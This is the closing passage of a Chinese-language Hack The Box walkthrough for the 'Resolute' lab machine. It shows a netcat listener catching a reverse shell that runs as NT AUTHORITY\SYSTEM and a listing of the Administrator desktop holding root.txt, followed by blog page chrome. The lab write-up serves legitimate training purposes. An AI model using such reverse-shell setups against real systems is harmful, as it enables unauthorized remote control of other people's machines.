<h5 id="以system身份获取shell："><a href="#以system身份获取shell：" class="headerlink" title="以system身份获取shell："></a>以system身份获取shell：</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss">$ rlwrap nc -lnvp <span class="hljs-number">443</span><br>listening on <span class="hljs-selector-attr">[any]</span> <span class="hljs-number">443</span> ...<br>connect to <span class="hljs-selector-attr">[10.10.16.7]</span> from (UNKNOWN) <span class="hljs-selector-attr">[10.10.10.169]</span> <span class="hljs-number">49883</span><br>Microsoft Windows <span class="hljs-selector-attr">[Version 10.0.14393]</span><br>(c) <span class="hljs-number">2016</span> Microsoft Corporation. <span class="hljs-attribute">All</span> rights reserved.<br><br>whoami<br>whoami<br>nt authority\system<br><br>C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure>

<p>我拥有了root.txt:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"> <span class="hljs-attribute">Directory</span> of C:\Users\Administrator\Desktop<br><br><span class="hljs-attribute">12</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2019</span>  <span class="hljs-number">06</span>:<span class="hljs-number">18</span> AM    &lt;DIR&gt;          .<br><span class="hljs-attribute">12</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2019</span>  <span class="hljs-number">06</span>:<span class="hljs-number">18</span> AM    &lt;DIR&gt;          ..<br><span class="hljs-attribute">04</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">11</span> AM                <span class="hljs-number">34</span> root.txt<br>               <span class="hljs-attribute">1</span> File(s)             <span class="hljs-number">34</span> bytes<br>               <span class="hljs-attribute">2</span> Dir(s)   <span class="hljs-number">2</span>,<span class="hljs-number">483</span>,<span class="hljs-number">277</span>,<span class="hljs-number">824</span> bytes free<br><br><span class="hljs-attribute">C</span>:\Users\Administrator\Desktop&gt;type root.txt<br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Active-Directory/" class="print-no-link">#Active Directory</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>HTB Walkthrough - Resolute</div>
      <div>https://crazyinside.github.io/post/HackTheBox-Resolute.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>World'sEnd</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>August 14, 2023</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/post/HackTheBox-Return.html" title="HTB Walkthrough - Return">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">HTB Walkthrough - Return</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/post/HackTheBox-RedCross.html" title="HTB Walkthrough - RedCross">
                        <span class="hidden-mobile">HTB Walkthrough - RedCross</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
